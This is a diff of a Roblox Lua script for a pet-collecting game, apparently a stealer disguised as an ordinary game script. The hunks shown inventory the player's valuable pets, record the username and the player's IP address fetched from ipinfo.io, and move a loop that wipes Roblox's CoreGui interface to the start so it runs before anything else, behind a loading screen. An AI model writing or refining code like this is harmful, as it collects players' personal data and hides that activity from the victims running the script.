@@ -4,6 +4,10 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
+
 local savedPets = Library.Save.Get().Pets
 hugeamount = 0
 for i,v in pairs(Library.Save.Get().Pets) do
@@ -180,10 +184,6 @@ local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
-
-for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy()
-end
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
